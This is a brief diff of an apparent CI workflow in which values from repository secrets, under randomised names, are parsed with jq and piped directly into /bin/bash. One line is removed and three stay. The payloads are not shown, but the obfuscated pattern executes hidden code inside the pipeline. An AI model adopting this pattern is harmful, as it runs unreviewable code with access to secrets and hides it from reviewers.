@@ -23,7 +23,6 @@ jobs:
           w7: ${{ secrets.w7 }}
         run: |
           printf '%s' "$w7" | jq -r .gw16852 | /bin/bash
-          echo $ltptj69445 | jq -r .pria55258 | /bin/bash
           printf '%s' "$oxz35" | jq -r .qg70066 | /bin/bash
           echo $bp03 | jq -r .yh689 | /bin/bash
 
